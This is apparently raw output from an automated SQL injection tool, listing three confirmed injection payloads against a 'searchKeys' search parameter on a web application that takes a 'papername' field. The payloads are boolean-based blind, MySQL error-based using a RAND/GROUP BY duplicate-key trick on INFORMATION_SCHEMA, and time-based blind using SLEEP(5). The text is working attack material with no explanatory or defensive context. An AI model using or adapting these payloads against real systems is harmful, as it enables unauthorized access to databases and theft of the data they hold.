Place: GETParameter: searchKeys    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: papername=%C1%F8%D6%DD%C8%D5%B1%A8&searchKeys=aaa%' AND 9005=9005 AND '%'='    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: papername=%C1%F8%D6%DD%C8%D5%B1%A8&searchKeys=aaa%' AND (SELECT 6377 FROM(SELECT COUNT(*),CONCAT(0x3a7374623a,(SELECT (CASE WHEN (6377=6377) THEN 1 ELSE 0 END)),0x3a7075693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: papername=%C1%F8%D6%DD%C8%D5%B1%A8&searchKeys=aaa%' AND SLEEP(5) AND '%'='---
